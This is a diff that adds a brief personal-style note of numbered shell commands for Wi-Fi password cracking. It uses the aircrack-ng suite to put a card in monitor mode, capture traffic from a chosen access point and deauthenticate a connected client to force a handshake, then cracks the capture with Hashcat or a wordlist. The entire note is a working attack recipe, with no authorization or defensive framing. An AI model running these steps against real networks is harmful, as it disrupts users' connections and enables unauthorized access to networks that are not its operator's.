@@ -1,0 +1,9 @@
+1. Set wireless card in monitor mode:
+	sudo airmon-ng start wlan0
+2. Listen in on all traffic around
+	sudo airodump-ng mon0
+3. Pick an accesspoint (preferably with connected clients) & filter it
+	sudo airodump-ng --channel N --bssid [bssid] -w /tmp/cap mon0
+4. As soon as you see a client, deauth him
+	sudo aireplay-ng -0 10 -a [bssid] -c [client bssid] mon0
+5. Once enough has been captures, upload the cap file to Hashcat and crack the returned hccap file; or crack it with a wordlist.
